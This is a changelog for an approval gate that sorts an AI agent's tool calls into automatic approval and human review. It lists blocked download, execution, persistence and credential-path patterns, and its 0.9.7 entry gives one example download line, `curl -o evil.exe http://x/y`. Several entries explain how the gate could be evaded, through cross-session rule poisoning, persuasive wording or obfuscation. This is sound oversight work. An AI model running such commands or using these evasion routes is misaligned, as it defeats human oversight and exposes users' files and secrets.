# 更新日志

本文件记录 dsh-approval-gate 的重要变更。版本号遵循 [语义化版本](https://semver.org/lang/zh-CN/)。

> 英文版见 [CHANGELOG.en.md](CHANGELOG.en.md)。

## [0.9.11] — 2026-10-05

**0.9.10 的迁移被种子规则架空了 —— 修种子文件。** 重启验证时抓到的。

启动顺序是 `normalizeConfig(config)` → `mergeSharedRules(config, bundledSeed)`，而 `mergeSharedRules` 是**只增不减**的并集。仓库种子 `allowlist.json` 里还留着裸 `"format"`，于是：

```
normalizeConfig   → 迁移删掉裸 format，补上 format c: / format /
mergeSharedRules  → 种子里的裸 format 又被并回来
```

线上实测结果：`denyKeywords` 105 → 107 条，形态化三条都在，**裸 `format` 也还在** —— 迁移等于没做。

- 修 `allowlist.json`（种子文件，会随包安装到 profile）：裸 `"format"` → `"format c:"` + `"format /"`（`format-volume` 原本就有）
- 迁移代码保留（线上配置里那条裸 `format` 还得靠它清掉），种子干净之后两者不再打架
- `seed-sync.test.mjs` 新增断言：**种子危险词里不得出现裸 `format`**，且必须含 `format c:` / `format /` —— 这条断言就是这次事故的护栏
- 用**线上真实配置 + 修好的种子**按真实启动顺序预演过：迁移后无裸 `format`、形态化三条保留、其他危险词一个没丢、`looksDeny` 四个场景全部符合预期

**教训（写给以后）**：`mergeSharedRules` 在 `normalizeConfig` 之后跑，所以任何「从配置里删东西」的迁移都必须同步改种子文件，否则会被并集悄悄还原。删/改类迁移的护栏应当放在 `seed-sync.test.mjs`。

## [0.9.10] — 2026-10-05

**修同一个 `format` 的另一半：危险词表里的裸 `format` 会误转人工。** 0.9.9 修的是审计表的标签（展示层），这一版修的是**真的多弹一次人工**。

危险词表 `DEFAULT_DENY_KEYWORDS` 里有一个裸的 `'format'`，`matchDenyKeyword` 的边界规则允许「独立成词的 format」命中，于是：

| 命令 | 修前 | 修后 |
|---|---|---|
| `Write-Output '--- format fix present? ---'` | ❌ 转人工 | ✅ 放行 |
| `npm run format` | ❌ 转人工 | ✅ 放行 |
| `gh run view 1 --json status --format json` | ✅ 放行（`-` 被左边界挡掉） | ✅ 放行 |
| `Get-Date -Format o` | ✅ 放行 | ✅ 放行 |
| `format C: /fs:ntfs` | ✅ 转人工 | ✅ 转人工 |
| `Format-Volume -DriveLetter D` | ❌ 放行（默认表里没这条） | ✅ 转人工 |

现场证据（2026-10-05）：我自己的 `Write-Output '--- format fix present? ---'` 触发了一次 `DENY`，审计日志里只留 `DENY pwsh mode=danger-full-access | escalate sandbox to danger-full-access: …`，看不出是哪个词命中的 —— 复现脚本定位到裸 `format`。

- 默认表：`'format'` → `'format c:'` + `'format /'` + `'format-volume'`（顺带补上 `Format-Volume`，它原本不在默认表里）
- **迁移**：已经落盘的配置（用户手写过很长一张危险词表）里若还有裸 `'format'`，`normalizeConfig` 会把它换成形态化三条并落盘 —— 幂等，其他关键词一个不动
- `looksDeny` 新增 3 条反例断言 + 2 条正例断言；迁移另有幂等断言

## [0.9.9] — 2026-10-05

**修一个审计表的误标：`format` 被当成「删除」。** 0.9.8 上线后的现场验证中发现的。

`src/zh.mjs` 的 `DELETE_RE` 里有一个裸的 `\bformat\b`（本意是 `format C:` 这种格式化磁盘），于是 PowerShell 里极常见的 `Get-Date -Format o`、`Format-List`、`--json … format` 全被标成「删除」—— 而「操作类型」行正是审批人第一眼判断风险的依据。实测 1219 条事件里 **13 条**被这么误标，全部来自裸 `format`。

- `format` 现在只认**磁盘格式化**形态：`format C:` / `format /q` / `Format-Volume`
- 破坏形态（`Remove-Item` / `rm -rf` / `git reset --hard` / `shutdown` / `mkfs` / `drop table`）不受影响
- 纯展示层修复，**不动任何裁决**：`DELETE_RE` 只喂 `actionKeyFor()`，不参与硬拒 / 危险词 / 白名单 / 判定
- 顺带确认 `DEFAULT_DENY_KEYWORDS` 里的 `format` **没有**这个问题：`matchDenyKeyword` 的左边界排除集含 `-`，所以 `-Format` 不会命中危险词层（现场证据：`Get-Date -Format` 的命令被正常放行）

## [0.9.8] — 2026-10-05

**第 ④ 步：git 按命令锚定 + 工作区外一律人工 + 敏感路径形态永远人工。** 用户 2026-10-05 决策。

### ① 规则只按真实事实匹配（「按命令锚定」）

规则的 `contains` / `keywords` 原本匹配的是 `justification + 命令 + files`，于是**模型的措辞能授予权限**：说明里写「git push 需要凭据管理器」，`contains:"git"` 就放行任意命令。

- 新增 `ruleAnchorText(command, files, targets)`：锚定文本只装**真实事实**（本次调用的命令、写目标、绝对路径目标），白名单层改用它匹配
- **实测（30 天 897 条自动放行，规则表 39 条真实规则）**：**30 条**有真实命令的规则放行在锚定后不再命中 —— 全是真误放行，例如 `gh run view` 被 `contains:"github"` 放行、`npm test` 被 `contains:"vitest"` 放行、`pwsh -File verify-branches.ps1` 被 `contains:"git"` 放行，共同点是**命令里根本没有那个词**
- 另有 **212 条**规则放行的命令**根本没被记录**（提权重试时 `tool/call` 尚未进入审批处理器看到的会话视图）。锚定为空 ⇒ 含 `contains` 的规则不匹配（fail-closed），这些请求改由判定器裁决
- 指纹来源同步锚定：追认 / 判定器不可用沉淀 / 中立确认学习的指纹都取自锚定文本，规则才能在锚定后的白名单层命中；**看不见真实操作时**退回说明措辞（否则「追认了却写不出指纹」，重试仍被拒）
- 追认的 `contains` 改为**目录级**（`extractRuleFingerprint`：绝对路径取一级父目录）——否则同一目录换个文件名就要重新审批一次、规则无限增殖。用户手写的 Rime 规则正是这个形状
- `extractFingerprintCandidates` 增加**一级父目录**候选，`keywords` 覆盖「同一目录下的同类操作」
- **两处刻意不锚定**：一次性凭条（追认选「仅本次」，用户对某一次重试的显式放行）与 `denyRules`（拒绝侧失配会让本该拦下的操作落到判定器手里，是安全回归）。两者都用 `looseMatchContext`

### ② 工作区外一律人工

- 目标含工作区之外的路径（`outside` / `mixed`）→ 转人工。动机是用户原话「确保模型不会多读我的一些敏感文件导致泄密」
- **位置排在白名单之后**：「一律」约束的是默认姿态，不是用户自己写下的规则。用户手写的 `%APPDATA%\Rime`、`weaseldeployer.exe` 等**本身就在工作区之外**的规则仍然生效
- 刻意**不覆盖 `unknown`**：提不出绝对路径不等于在区外（30 天 368 条自动放行落在 unknown），一并拦下等于把所有命令类调用打回人工
- **DSH 配置档补口**：命令类工具（`pwsh`/`bash`）没有 `file_path`，`hardDenyFacts` 的 dsh-config 档一直没生效。新增「命令目标全在 `$DSH_HOME` 下 → 自动放行」，实测把 **54 条**区外维护（`pnpm --dir … install`、改 pin、备份 `cordis.patch.yml`）留在自动档，例外仍是审批门自身数据目录与凭据类文件名
- 新增设置页开关「工作区外一律人工」，关闭后退回判定器

### ③ 敏感路径形态永远人工

- 新增 `sensitiveTargetHit(paths)`：命中即人工，排在 DSH 配置自动放行与白名单**之前** —— 凭据文件不因为「路径在 profile 下」或「规则命中」而被放行
- 口径是**目录段 / 文件名**，不做全路径子串匹配：`.ssh` `.aws` `.gnupg` `.kube` `.docker` `gcloud` `auto-approve` / `id_rsa` `credentials*` `.env*` `.npmrc` `.netrc` `.git-credentials` `*.pem` `*.key` `*.pfx` `*.p12` `*.kdbx` `Cookies` `Login Data` `Web Data` `Local State`
- 工作区内的 `.env` / `*.pem` 同样命中；`src/credential/transport.ts`、`scripts/secure-secret-hydration.test.ts` 这类**源码文件不误报**（宽口径版本实测 2 次误报，收紧后为 0）

### 实测（真实 `events.jsonl`，30 天 1210 事件 / 897 条自动放行 / 147 次人工提示）

| 项 | 数值 |
|---|---|
| 因第 ④ 步变成人工的自动放行 | **31**（敏感路径 2 + 工作区外 29）⇒ 人工提示 147 → 178（**+21%**） |
| DSH 配置档补口保住的自动放行 | **54**（补口前该档只有 2 条生效） |
| 锚定后失去规则放行（有真实命令 = 真误放行） | **30** |
| 锚定后失去规则放行（命令未记录 → 交给判定器） | **212** |
| 规则表 39 条里「在真实命令上一次都没命中」的 | **9**（`worker process` / `child process` / `subprocess` / `凭据` / `typescript` / `eslint` / `weaseldeployer.exe` / `workspace-write` / …） |

> 那 9 条（以及仍会因路径里的偶然词命中、例如 `contains:"main"` 命中 270 次的几条）建议按命令里的真实词重写或直接删掉。注意「0 命中」也可能只是那段时间没记录到命令，不是判决书。

### 行为变化（需要知道）

- **判定器流量变宽**：212 条原本靠措辞规则放行的请求改为判定器裁决；判定器不可用时它们会转人工
- **工作区外不再沉淀规则**：`forwardToHuman(..., 'outside')` 只记事件不写规则 —— 「一律人工」意味着每次都过目（`flash-failed` 的沉淀路径仍然存在，只是区外目标根本走不到判定器）
- 三个既有测试用例相应调整：`pipeline` 的 neutral-deny 与 flash-failed 沉淀改用**工作区内**目标（区外会被新层接管）、`fence-scope` 的区外断言改为「转人工」
- 新增 `test/step4-anchor.test.mjs`（15 组断言）

### 下一步（尚未实施）

删掉那 9 条只在措辞上命中的规则；把 `contains:"main"` / `"job"` / `"desktop"` / `"iOS"` 这类靠路径偶然词命中的宽规则收窄。

## [0.9.7] — 2026-10-04

**工作区内按定域放行，同时给「下载 / 可执行产物」加一道否决层。** 用户决策：工作区内的增删改查风险可控，不必每次人工；但模型被诱导下载恶意脚本、exe 时必须触发审批。

这两条天然矛盾 —— `curl -o evil.exe http://x/y` 的目标**完全在工作区内**，纯定域规则会直接放行。所以围栏必须是定域放行之上的**否决层**，且排在白名单与学习之前：否则一次追认沉淀的 `contains` 宽规则就能把「下载」永久放行。

### 新增：危险动作围栏（确定性，转人工且不学习、不可追认）

| 类别 | 命中特征 | 豁免 |
|---|---|---|
| 网络下载 | `curl` / `wget` / `aria2c` / `bitsadmin` / `Invoke-WebRequest`\|`iwr` / `Invoke-RestMethod`\|`irm` / `Start-BitsTransfer` / `certutil -urlcache` / `DownloadString`\|`DownloadFile`\|`DownloadData` / `gh release download` | 命令里的 URL **全部**指向本机（`http://127.0.0.1:1933/health` 是健康检查，不是取物） |
| 动态执行 | `Invoke-Expression` / `iex` / `-EncodedCommand` / `FromBase64String` / `certutil -decode` / `\| bash`\|`sh`\|`pwsh`\|`powershell`\|`cmd`\|`iex` | — |
| 依赖安装 | `npm`\|`pnpm`\|`yarn`\|`bun` `i`\|`install`\|`add`\|`dlx`\|`exec` / `pip install` / `cargo`\|`go`\|`winget`\|`choco`\|`scoop install` / `docker pull` | 命令指向 `$DSH_HOME`（profile / 插件依赖那一档本就自动放行） |
| 持久化 | `schtasks` / `reg add` / `New-Service` / `sc create` / `core.hooksPath` / `Set-ExecutionPolicy` / `netsh advfirewall` / `Add-MpPreference` / `bcdedit` / `wmic` / `takeown` / `icacls` | — |
| 递归删除 | `Remove-Item … -Recurse` / `rm -r…` / `rmdir /s` / `rmtree` / `git clean` / `git reset --hard` | **单文件清理不拦**：推送后删掉 `_commit-msg.txt` 是日常动作，30 天 36 次，全拦会把人工提示从 147 抬到 180 |
| 可执行产物 | 写目标扩展名 `.exe .dll .msi .bat .cmd .ps1 .vbs .hta .lnk .reg .jar …`，或落在 `.git/hooks/`、`.github/workflows/`、`Startup/`、`sitecustomize.py` | `.sh`/`.py`/`.js` 不在列（开发工作区天天产出）；「下载 .sh 再执行」由前两行覆盖 |

**判定口径刻意收窄，避免误报**（每一条都对应实测到的假命中）：

- **命令类工具只看命令里的「落盘目标」**（重定向 / `-OutFile` / `-o` / `--output` / `-DestinationPath` / `Out-File` / `Set-Content` / `open(...,'w')`），不看它被 `resolveToolCallFiles` 判定的「写目标」—— 后者的写特征很宽（`*>` 重定向就算写），会把 `pwsh -File .\build.ps1 *> .\tmp\x.log` 里**被执行**的 `.ps1` 误判成「本次产出的可执行文件」
- **持久化按动词判定，不按路径出现**：`.github/workflows` 出现在读取命令或 `git add` 的参数里不是持久化（实测 6 次假命中）
- `Start-Process` 不在围栏里（启动本地服务是常规动作，实测 2 次假命中）

### 新增：定域放行（可开关）

- 位置：白名单之后、判定器之前。`targetScope === 'inside'` 且未命中围栏 ⇒ 直接放行，事件记 `verdict: 'scope'`，**判定器零调用**
- 定域输入补上**解析后的相对写目标**：`write`/`edit` 常给 `src/x.mjs`，不解析就永远是 `unknown`（= 不放行），这条最常见的写操作本来会完全失效
- **fail-closed 不变**：`unknown`（提不出绝对路径 / 含 `..` 穿越）、`outside`、`mixed` 一律不放行
- 设置页新增开关「定域放行：目标全部在工作区内 → 直接放行」，关闭后回到旧行为（区内提权也走判定器/人工）
- 拦截原因进事件（`facts.fenceText`）与中文卡正文（新增 `拦截：…` 行），字段表格新增「拦截原因」行（警示色）—— 没有它，卡片上只有模型自己的说法

### 实测（真实 `events.jsonl`，30 天 1204 事件 / 147 次人工提示）

- 围栏命中 **23 次**，其中 13 次原本是自动放行 ⇒ 新增人工 ≈ **0.4 次/天**
- 定域放行省下 **23 次**人工提示（另外 4 次 inside 提示被围栏挡住）
- 净效果：**30 天少 10 次人工提示**（−7%），同时第一次拥有了「下载 / 可执行产物」这道闸
- 分布：人工提示里 `unknown` 83 / `outside` 35 / `inside` 27 / `mixed` 2 —— 区内只占 18%，所以定域放行的上限本来就不高（与 0.9.6 的判断一致）
- 围栏贡献最大的一项是**递归删除（15 次）**，其中 4 次是 heredoc 脚本正文里含 `rm -rf` 的假命中。想拿满 −23 的收益就把这一档去掉，代价是区内递归删除变成永久自动

### 行为变化（需要知道）

- **判定器看到的流量变窄**：工作区内的调用不再进入判定层。原先「区内调用 → 判定器 → allow」的路径改由确定性规则接管
- 三个既有测试文件（`pipeline` / `session-scope` / `path-targets`）显式设 `scopeAutoAllow: false`：它们测的是判定管道与规则作用域，不是定域放行；定域放行与围栏由新增的 `test/fence-scope.test.mjs` 单独覆盖
- `pipeline.test.mjs` 的脱敏用例把 `curl -H "Authorization: Bearer …"` 换成普通命令 —— 前者现在会命中网络下载围栏，判定器根本不会被调用

### 诚实交代：围栏挡不住什么

围栏是**文本特征**匹配，能被刻意混淆绕过（base64、变量拼接、二次下载、先写脚本再执行）。它挡的是「模型被诱导」这类非对抗性失败，不是定向攻击。真正的边界仍然是沙箱与人工。

### 下一步（尚未实施）

④ git 按命令锚定（匹配上下文去掉 justification 措辞）+ 工作区外一律人工 + 敏感路径形态（`.ssh` / `.aws` / `id_rsa` / `*.pem` / `.env` / `credential` / `token` / `Login Data` / `Cookies`）永远人工；同时删掉 5 条宽泛的种子规则（30 天 22 次使用）。

## [0.9.6] — 2026-10-04

**审批记录终于能回答「这次动的是工作区内还是工作区外」**：新增确定性绝对路径提取与目标定域，命令类工具（`pwsh` / `bash`）的绝对路径不再丢失，说明措辞里的相对片段不再冒充目标。

这是「减少人工审批」路线的**前置一步**（不是放行规则本身）：只有先能可靠回答「目标全在工作区内」，下一步「工作区内自动放行」才敢做。本版**没有改动确定性裁决逻辑** —— 硬拒、危险词、白名单、学习、放行/转人工的判定分支一行未动。唯一的行为面变化是**判定模型的输入多了一份真实路径事实**（见下），因此判定模型的输出可能随之变化；这一点离线无法验证，只能靠重启后的真实流量观察。

### 背景（真实日志取证）

`cd D:\GitHub_Clone\x; git push origin main` 这类命令里明明有绝对路径，却因为写目标提取要求「命令含写特征」而整体落空，事件记录回退到从**说明措辞**里正则捞片段：

- 628 条带命令的真实事件里 **458 条（73%）记录不到任何绝对路径**
- 记录到的「目标」是 `IamNewHands/dsh-approval-gate`、`origin/main`、`.git/objects` 这类相对片段 —— 无法定域，也就无法审计「模型有没有读到工作区外」
- 只读目标（`Get-Content`）同样提不出来，判定模型看到的 `filesystemEffects` 是空的，只能凭措辞猜

### 变更

- **`src/paths.mjs` 新增三个纯函数**（无 IO，可单测）：
  - `extractAbsolutePaths(text)` → `{ raw, path, kind }[]`：只认四种绝对形态（盘符 / UNC / POSIX 根 / `~`），`kind` 分 `data` / `program` / `device`
  - `classifyPathScope(paths, roots)` → `{ scope, inside, outside }`，`scope` ∈ `inside` / `outside` / `mixed` / `unknown`
  - `hasPathTraversal(text)`：检测 `..\` / `../` 穿越
- **只提取绝对路径，相对片段一律不收**：`origin/main`、`refs/heads/x`、`src/a.ts`、`IamNewHands/repo`、URL 路径段都不产出目标 —— 它们无法单独定域，收进来只会制造「看起来在工作区内」的假象
- **引号内整段优先**：`'C:\Program Files\Git\bin\bash.exe'` 不再被截成 `C:\Program`；`/d/GitHub_Clone/x`（Git-Bash 写法）折算到 `D:` 后再比较
- **系统程序位置与设备伪文件不算数据目标**：`/usr/bin/env`、`C:\Windows\System32\…`、`C:\Program Files\…`、`/dev/null` 不参与定域，否则 `bash.exe` 会把纯工作区操作误判成「工作区外」
- **`src/index.mjs` 新增 `resolveToolCallTargets()` 与 `targetScopeOf()`**：命令类工具即便只读也提取目标；事件新增 `targets`（绝对路径，最多 12 条）、`targetScope`、`targetTraversal`
- **`files` 语义刻意不变**：仍只装写目标（供改动前快照）。只读目标只进 `targets` —— 否则 `Get-Content ~/.ssh/id_rsa` 会把私钥内容复制进审批门自己的快照目录，等于新增一个泄漏面
- **判定模型输入补上真实路径**：`filesystemEffects` 改为「命令里的绝对路径 ∪ 写目标」，`cd D:\ws\x; git push` 这类命令不再以「不涉及任何文件」的形态送判
- **字段表格新增「目标位置」行**（`src/zh.mjs` + `client.js`）：`工作区内` / `工作区外` / `跨工作区内外` / `无法定域（没有绝对路径）`，非 `inside` 时用警示色；宿主审批卡的纯文本多一行 `目标：…`。这与「影响范围」（沙箱模式）是两个不同的轴，因此分成两行

### fail-closed 边界（刻意保守）

| 情形 | 结果 | 理由 |
|---|---|---|
| 一个 `data` 目标都没有 | `unknown`（**不是** `inside`） | 相对片段、变量拼出的路径（`-D $dir`）都算未知；`unknown` 必须与 `outside` 同等对待 |
| 命令里有 `..` 穿越且字面量全在工作区内 | 降级为 `unknown` | `cd D:\ws\x; Get-Content ..\..\Users\me\.ssh\id_rsa` 只提取到工作区内路径，报 `inside` 是危险的假阴性 |
| URL 路径段、`owner/repo` 散文 | 不产出目标 | 不是文件系统目标 |

### 回放验证（真实日志，不是推演）

- **30 天（1184 事件，628 条带命令）**：定域 `inside` 475 / `mixed` 29 / `outside` 131 / `unknown` 549。原先「只有相对片段」的 276 条事件里，**138 条（50%）现在可定域**
- **最近 7 天（488 事件，430 条带命令）**：`inside` 309 / `mixed` 20 / `outside` 82 / `unknown` 77。原先 145 条片段事件里，**99 条（68%）现在可定域**
- 自动放行事件（30 天 869 条）按新定域：`inside` 423 / `outside` 61 / `mixed` 25 / `unknown` 364 —— 这是第一次能给出这个分布

### 已知限制与残余风险（写在明处）

- **内嵌文本会产出假目标**：命令里嵌了脚本/配置正文时（Python heredoc 里的 YAML），可能提到 `/build-app.yml` 这类 POSIX 根形态的假路径。它只会让定域**偏保守**（报 `outside`），不会误报 `inside`
- **事件里的 `command` 截断在 400 字符**：超长命令的目标可能提不全 —— 只影响审计记录，实时裁决用的是完整命令
- 本版**不改动确定性裁决**：`unknown` 与 `outside` 目前在管道里都不影响放行/转人工，只落审计。**但判定模型的输入变了**（`filesystemEffects` 从「写目标」扩成「命令绝对路径 ∪ 写目标」），所以判定层对命令类调用的裁决可能与以前不同 —— 方向应当是更准（不再凭措辞猜），但离线测不出来，需要观察真实流量

### 下一步（尚未实施）

按定域放行（目标全在工作区内 ⇒ 自动放行；有一个在外 ⇒ 人工）、git 按命令锚定、工作区外一律人工 + 敏感路径形态永远人工。回放显示最近 7 天的 13 组人工审批里有 **11 组目标全在工作区内**，即该杠杆的近期上限。

## [0.9.5] — 2026-10-04

**DSH 自身配置改动不再弹人工**：`$DSH_HOME` 下的 profile / 插件 / 依赖改动自动放行（两道例外仍人工）。这是对 2026-09-18「DSH_HOME 写入永远人工」决定的**反转**，依据是用户 2026-10-04 的口径与真实日志统计。

### 背景与口径

用户目标：**减少人工审批**。分档口径——

| 区域 | 处理 |
|---|---|
| 工作区内操作 | 不需要审批（风险可控） |
| git 相关操作 | 不需要审批（风险可控） |
| **DSH 自身配置修改** | **不需要审批（风险可控）** ← 本次落地 |
| 其他区域的增删改查 | 保留人工，尤其防「模型多读敏感文件导致泄密」 |

实测依据（`$DSH_HOME/auto-approve/{audit.log,events.jsonl}`，30 天 2026-09-05→10-04）：

- 总量：1178 事件、869 次自动放行（73.8%）、145 次转人工（**100% 被批准、0 次拒绝**）、11 次静默拒绝
- **最近 7 天只有 36 次人工，其中 20 次（56%）是 DSH 配置修改** —— `cordis.patch.yml`、profile `package.json`、`pnpm-workspace.yaml`、profile 目录
- 自动放行里「工作区外的真实路径」只有 21 条，全是用户明确要求做的事（Clash AppData 16 / DSH 4 / OpenViking 1）；**读敏感文件被自动放行 0 条**

### 变更

- **`src/index.mjs`：硬拒层新增 `dsh-config` 档**（`hardDenyFacts` 返回 `'dsh-config'`）：目标在 `$DSH_HOME` 下即自动放行。**该档延后到 DENY 层之后执行**，因此命中不可逆危险词仍然先转人工（危险词永远最高优先）
- **两道例外仍转人工**（`DSH_CONFIG_EXCLUDE_RE`）：
  1. **审批门自身的数据目录** `$DSH_HOME/auto-approve/` —— 规则 / 审计 / 学习 / 快照。改它等于放行自己，安全组件不能把自己交给被它看守的对象改写
  2. **凭据类文件名**：`api-key` / `apikey` / `token` / `secret` / `credential` / `password` / `keyring` / `.env` / `.npmrc` / `.netrc` / `.git-credentials` / `id_rsa` / `id_ed25519` / `*.pem` / `*.key` / `*.pfx` / `*.p12` / `login data` / `cookies` —— 这条正对用户「防多读敏感文件泄密」的诉求
- 自动放行事件标 `verdict: 'dsh-config'`（审计 `ALLOW … (dsh-config: DSH_HOME path …)`），客户端显示「DSH 配置（自动放行）」
- **提示层指导文本**补一句：DSH 自身配置可直接执行、不必先征求同意（凭据文件与审批门自身数据除外），减少模型无谓的预先询问
- 客户端 `VERDICT_NEUTRAL` 纳入 `dsh-config`（按常规自动放行配色）

### 回放验证（用真实日志，不是推演）

- 最近 7 天 20 次 DSH 配置人工 → **20 次全部变成自动放行**，例外命中 0 次
- 30 天日志里出现过 12 条不同的 `$DSH_HOME` 路径：10 条自动放行（`cordis.patch.yml` 52 次、`package.json` 31 次、profile 目录 30 次、`skills/` 9 次、`pnpm-workspace.yaml` 8 次、`pnpm-lock.yaml` 8 次、`node_modules/dsh-approval-gate` 7 次、`.dsh` 根 4 次、`node_modules/dsh-win-notify` 2 次），2 条仍人工（`auto-approve/allowlist.json` 5 次、`auto-approve` 1 次）
- 真实日志里**没有**出现新增例外所覆盖的敏感路径 —— 这两道例外是纯保险，不承担当前收益

### 残余风险（有意保留，写在明处）

- `$DSH_HOME/skills/**` 也进入自动放行。技能是**未来回合的指令**，属于自我改写面；用户本人维护技能，故按「DSH 配置风险可控」一并放行。若要收窄，在 `DSH_CONFIG_EXCLUDE_RE` 里加一段即可
- `profiles/*/node_modules/**` 含插件代码（含本插件自身）。写它在**重启后才生效**，且用户的既定流程是从 git 重装；`auto-approve/` 数据仍人工，所以「改规则放行自己」这条路径没有打开

### 回归测试

- `test/absorbed.test.mjs` 用例 4：分档断言改为「reject 凭据/系统路径 → `dsh-config` profile 配置 / package.json / skills → `human` 门自身目录 / `api-key.json` / `.env`」
- `test/pipeline.test.mjs` 用例 3：目标改为**审批门自身数据目录**（仍人工）；用例 3b 重写为 **DSH 配置档的三条边界**：① profile 改动自动放行、判定器零调用、事件标 `dsh-config`、不计数；② 门自身数据目录仍转人工；③ 命中毒品词时 DENY 层压在 dsh-config 档之前（事件 `path === 'deny'`）
- docs/GUIDE（中/英）：管道图、⓪ 硬拒层三档描述、安全设计第 1 条、测试表全部同步

### 兼容

- **反转 2026-09-18 的决定**：`$DSH_HOME` 目标不再「永远人工」。home 根、其他工作区外路径、危险词、凭据外泄的行为**完全不变**
- 无配置迁移、无需改动 `allowlist.json`；`version` 仍为 4
- 与 0.9.4 的作用域模型无交互：`dsh-config` 是管道第 1b 步的确定性放行，不写规则、不计数

## [0.9.4] — 2026-10-04

**作用域改为可选**：新审批可指定「仅本次 / 本会话 / 全局」，默认本会话；**0.9.3 判为停用的旧沉淀规则迁回全局生效**（用户 2026-10-04 决定）。

### 背景

0.9.3 为堵住跨会话投毒，做了两件偏严的事：① 无归属的自动沉淀/追认规则一律**停用**；② 审批产生的规则一律只在本会话生效。这挡住了投毒，但也把用户**原先沉淀好的白名单**一起废掉了。本次按用户决定改成「存量迁回全局 + 增量可选作用域」。

### 变更

**作用域模型（src/index.mjs）**

- 新增 `ruleScope(rule)` 作为作用域判定**唯一 owner**：`'global'` / `'session'` / `'none'`
  - 显式 `scope:'global'` → 全局（新审批选「全局」，或从会话规则「提升为全局」）
  - 显式 `scope:'session'` → 必须有 `sessionId`；**没有归属时返回 `'none'`（永不匹配）**，fail-safe：证明不了归属就绝不因此升级成全局
  - 无 `scope`：带 `sessionId` → 会话作用域（0.9.3 期间产生的规则）；不带 → **全局**（旧沉淀/追认/判定器不可用沉淀、用户手写、仓库种子、内置默认）
- `ruleUsableInSession()` 改为基于 `ruleScope()`；上一版按描述前缀「停用旧沉淀」的判据（`LEARNED_RULE_DESC_RE`）整段删除

**新审批的作用域（三选一）**

- 追认端点接受 `scope: 'once' | 'session' | 'global'`（缺省取设置页的沉淀作用域）
  - `once`：**不写规则**，挂一张一次性额度，只放行 AI 重试的那一次；额度消费即失效（只存内存，进程重启后重试本身也不存在了，无残留状态）
  - `session`：写入带归属的会话规则（原有行为）
  - `global`：写入全局规则 —— 用户显式选择，因此不再要求会话归属
- 设置页 ② 白名单层新增「新审批沉淀的作用域」：**仅本会话（默认）/ 全局**，决定人工确认后的自动沉淀（学习达标、判定器不可用后批准）写在哪一层
- 白名单卡片：每条规则显示作用域标签（全局 / 本会话），会话规则提供**「提升为全局」**按钮（新 API `op=promote`，可重复调用，已全局时幂等返回 `already`）

**界面**

- 追认按钮从一个变成三个：**仅本次 / 本会话 / 全局**（提示条与审批记录行都有，各带 tooltip 说明）；提示条动作区允许换行
- 审批记录行按追认时的作用域补注：`已追认放行 · …（仅本次）` / `（已写入本会话规则）` / `（已写入全局规则）`；事件 API 新增下发 `reconsiderScope`
- 自动放行事件新增两种判定路径文案：`once`（追认 · 仅本次放行）、`learned-judge-unavailable`（已确认操作，判定器不可用）

### 回归测试

- `test/session-scope.test.mjs` 重写为 9 组：作用域语义表（含「声明 session 却无归属 → 永不匹配」）、会话规则只放行归属会话、**旧沉淀规则对任何会话都放行**、denyRules 仍全局、「仅本次」不写规则且额度消费一次即失效、追认 session/global 各自生效、一键提升为全局、沉淀作用域设置决定写在哪一层
- `test/reconsider.test.mjs` 5b：改为断言 `scope` / `sessionScoped` / `sedimentScope` 注解，以及旧无归属沉淀规则的 `scope === 'global'`
- `test/client-render-smoke.test.mjs`：6c 改为作用域标签 +「提升为全局」+ 沉淀作用域设置；3c 增断言「（仅本次）」标注；追认按钮断言跟随三作用域

### 兼容

- **撤销 0.9.3 的停用行为**：`allowlist.json` 里旧的无归属沉淀/追认规则重新生效（全局），无需迁移
- 0.9.3 期间产生的**带 `sessionId` 的规则仍按会话生效**（无 `scope` 时判为 session），不会被本次改动放大成全局
- 用户手写（描述「用户自定义」）、仓库种子、内置默认规则始终全局
- 无 schema 迁移，`allowlist.json` 的 `version` 仍为 4

## [0.9.3] — 2026-10-03

> ⚠️ 本版「旧的无归属沉淀规则**停用**」与「审批规则一律只在本会话生效」已被 **0.9.4 取代**：存量迁回全局，新审批改为可选作用域（默认本会话）。见上一条。

**审批只在当前会话生效**：学习计数与它沉淀的放行规则不再跨会话共享；同时收紧 API 来源校验（补 scheme 与端口比对）。对应上游 issue #4 的 P0-2 与 P0-3。

### 问题

- **学习状态全局共享，可被「养规则」下毒**（issue #4 P0-2）：`learning.json` 的计数 key 只有 `工具|模式|类别`，不分会话；任一会话反复触发同一操作、由人工确认到阈值后，就会沉淀出一条写进 `allowlist.json` 的**全局**放行规则，之后影响所有会话。失控或恶意会话可以这样给全局下毒，而这正是「危险转人工」判定链被绕过的路径。追认（「重新审批通过」）写出的规则同样是全局的
- **来源校验只比主机名**（issue #4 P0-3）：旧实现写的是 `u.hostname === host.split(':')[0]`——不比 scheme、不比端口，于是「名字相同」就能过：`https://` 页面、任意端口的页面、`javascript:` / `data:` 形态的来源全部放行。破坏性端点（rules / setup / revert / snapshots-clear）因此在退化路径（未加载 connection 服务时）暴露给跨源页面

### 变更

**作用域（src/index.mjs）**

- 学习计数 key 改为 `sessionId|tool|mode|category`：确认次数只在产生它的会话里累计
- 放行规则新增可选 `sessionId` 字段；新增 `ruleUsableInSession()` / `rulesForSession()`：带 `sessionId` 的规则只在归属会话生效
- **旧版无归属的自动沉淀规则停用**：`自动沉淀：` / `判定器不可用，人工批准后沉淀：` / `用户追认：` 三种描述前缀的规则，因为无法证明属于哪个会话，在任何会话都不再参与匹配（它们恰好是「跨会话放行」的存量）。用户手写规则（描述「用户自定义」）、仓库种子与内置默认规则仍然全局生效——那属于「配置」，不是「审批」
- **denyRules 有意保持全局**（不对称设计）：拒绝侧跨会话只会多弹一次人工，绝不会自动放行任何东西，保持全局是更安全的一侧
- 追认端点写入的规则带 `sessionId`（取自事件，缺失时退回请求体）；两者都没有 → 400，让用户改用手写白名单，而不是落一条无法限定范围的全局规则
- 规则去重/删除改为 `sameAllowRule()`（新增会话维度）：否则会话 B 的沉淀会被误判为「已存在」而复用会话 A 的规则，表现为「批准了却仍弹人工」
- 学习 key 带上会话前缀后条数会随会话数增长，新增 400 条上限（超出按插入顺序淘汰最旧的）；所有落盘统一走 `saveLearning()`

**来源校验（src/index.mjs）**

- 来源必须与请求自身的 `Host` **逐字同源（scheme + host + port）**；唯一的例外是「请求 Host 本身是回环地址 且 来源也是回环别名」——覆盖 127.0.0.1 / localhost / [::1] 之间的跨端口访问
- 非 `http(s)` 来源（`javascript:` / `data:` / `null`）一律拒绝
- scheme 判据取自 `req.socket.encrypted`，其次是 `x-forwarded-proto`；**两者都拿不到时不做 scheme 比对**（反代未声明该头时若按 http 强判，会把用户的 https 设置页打成 403）
